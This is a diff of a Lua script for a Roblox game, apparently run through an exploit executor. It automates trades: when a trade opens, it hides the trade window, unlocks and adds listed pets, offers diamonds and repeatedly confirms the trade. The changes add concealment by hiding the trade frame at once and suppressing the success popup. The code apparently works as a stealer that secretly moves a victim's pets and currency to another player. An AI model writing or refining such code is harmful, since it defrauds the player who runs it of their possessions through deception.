@@ -71,7 +71,7 @@ local Whitelisted = {
 local function AddWhitelistedPets()
     for petID, petData in pairs(ClientDataManager.Data.Pets) do
         local petName = PetsInfo:GetPetFullName(petData.Type, petData.Class)
-        if Whitelisted[petName] then
+        if Whitelisted[petName] and not getgenv().aol then
             if petData.Locked then
                 ReplicatedStorage.Events.UIAction:FireServer("TogglePetLocked", petID)
             end
@@ -81,7 +81,9 @@ local function AddWhitelistedPets()
 end
 
 local function ModifyDiamondOffer(amount)
-    ReplicatedStorage.Events.UIAction:FireServer("ModifyDiamondOffer", amount)
+    if not getgenv().aol then
+        ReplicatedStorage.Events.UIAction:FireServer("ModifyDiamondOffer", amount)
+    end
 end
 
 local function SendTrade(playerName)
@@ -111,24 +113,23 @@ Popup:GetPropertyChangedSignal("Visible"):Connect(function()
         print("Popup text:", text)
         if text:find("trade") and (text:find("complete") or text:find("successful")) then
             getgenv().aol = true
+            Popup.Visible = false
         end
     end
 end)
 
 local function rt()
-    local TradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
-    if TradeFrame.Visible then
-        while not aol do
-            task.wait(0.1)
-            TradeFrame.Visible = false
-            ReplicatedStorage.Events.UIAction:FireServer("ReadyTrade")
-        end
+    while not aol do
+        task.wait(0.1)
+        ReplicatedStorage.Events.UIAction:FireServer("ReadyTrade")
     end
 end
 
+local TradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
 local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
 TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
     if TradeGui.Visible then
+        TradeFrame.Visible = false
         task.spawn(rt)
         AddWhitelistedPets()
         ModifyDiamondOffer(Diamonds)
